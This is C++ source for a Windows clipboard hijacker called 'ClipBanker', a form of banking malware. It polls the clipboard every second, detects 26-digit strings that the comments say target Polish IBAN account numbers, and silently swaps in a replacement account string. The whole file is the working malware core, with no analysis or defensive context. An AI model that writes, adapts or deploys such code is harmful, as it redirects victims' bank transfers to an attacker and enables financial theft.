#include <windows.h>
#include <stdio.h>
#include <regex>


std::regex ClipBank_regex("[0-9]{26}"); // Example regex (to catch Polish IBAN)

void ClipBanker(){

    HANDLE msg;
    while (true) {
        if (OpenClipboard(NULL)){
            msg = GetClipboardData(CF_TEXT);
            const char* v = (const char*)msg;
            if (std::regex_search(v,ClipBank_regex)){

                const char* output = "Bank Account Number";
                const size_t len = strlen(output) + 1;

                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem),output,len);
                GlobalUnlock(hMem);
                OpenClipboard(0);
                EmptyClipboard();
                SetClipboardData(CF_TEXT,hMem);
                CloseClipboard();

            }
            CloseClipboard();
        }
        Sleep(1000);
    }

}

int main(){

    ClipBanker();
    return 1;
}
